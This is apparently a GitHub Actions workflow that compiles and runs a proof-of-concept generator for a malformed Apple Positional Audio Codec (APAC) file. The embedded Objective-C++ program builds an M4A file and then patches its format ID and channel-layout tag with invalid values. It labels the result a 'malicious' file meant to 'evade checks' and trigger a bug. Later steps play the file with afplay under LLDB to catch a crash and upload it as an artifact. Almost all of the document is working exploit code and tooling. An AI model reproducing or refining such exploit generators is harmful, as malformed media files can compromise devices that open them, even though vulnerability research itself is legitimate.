name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: This script now creates a valid AAC file, then manually corrupts it into a malicious APAC file.
      - name: Patch encodeme.mm for Evasion and Corruption
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to evade checks and corrupt the APAC file..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <stdlib.h>
          #include <string.h>

          // Helper function to write a simple, valid AAC M4A file
          bool createValidBaseFile(const char* path) {
              CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)[NSString stringWithUTF8String:path], kCFURLPOSIXPathStyle, false);

              AudioStreamBasicDescription asbd = {0};
              asbd.mSampleRate = 48000;
              asbd.mFormatID = kAudioFormatMPEG4AAC; // Use a standard, valid format ID first
              asbd.mFramesPerPacket = 1024;
              asbd.mChannelsPerFrame = 4;

              AudioFileID audioFile;
              OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
              if (status != noErr) return false;

              // Write a small amount of data to create a valid file structure
              UInt32 numPackets = 5;
              char dummy_data[1024] = {0};
              for (UInt32 i = 0; i < numPackets; ++i) {
                  AudioStreamPacketDescription packetDesc = {0};
                  packetDesc.mDataByteSize = sizeof(dummy_data);
                  UInt32 packetsInThisWrite = 1;
                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), &packetDesc, i, &packetsInThisWrite, dummy_data);
                  if (status != noErr) break;
              }
              
              AudioFileClose(audioFile);
              CFRelease(fileURL);
              return status == noErr;
          }

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  const char* pocName = "output_apac_evasion_poc.m4a";

                  // Step 1: Create a valid file to act as a container.
                  if (!createValidBaseFile(pocName)) {
                      fprintf(stderr, "Failed to create a valid base M4A file.\n");
                      return 1;
                  }
                  fprintf(stderr, "Successfully created a valid base file.\n");

                  // Step 2: Manually corrupt the file to change its identity and trigger the bug.
                  FILE *file = fopen(pocName, "r+b");
                  if (!file) {
                      fprintf(stderr, "Failed to re-open the file for corruption.\n");
                      return 1;
                  }

                  // Corruption #1: Change the format ID from 'aac ' to 'apac'.
                  // This is in the 'stsd' atom, a common location for this data.
                  fseek(file, 0x58, SEEK_SET); // Estimate offset for format ID
                  fwrite("apac", 1, 4, file);
                  
                  // Corruption #2: Corrupt the channel layout tag as before.
                  fseek(file, 0x110, SEEK_SET); // Estimate offset for layout tag
                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                  
                  fclose(file);

                  fprintf(stderr, "PoC: Manually corrupted file to 'apac' with invalid channel layout.\n");
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step runs the full generate-then-corrupt process.
      - name: Generate and Corrupt APAC File
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_evasion_poc.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with evasion PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_evasion_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_evasion_poc.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
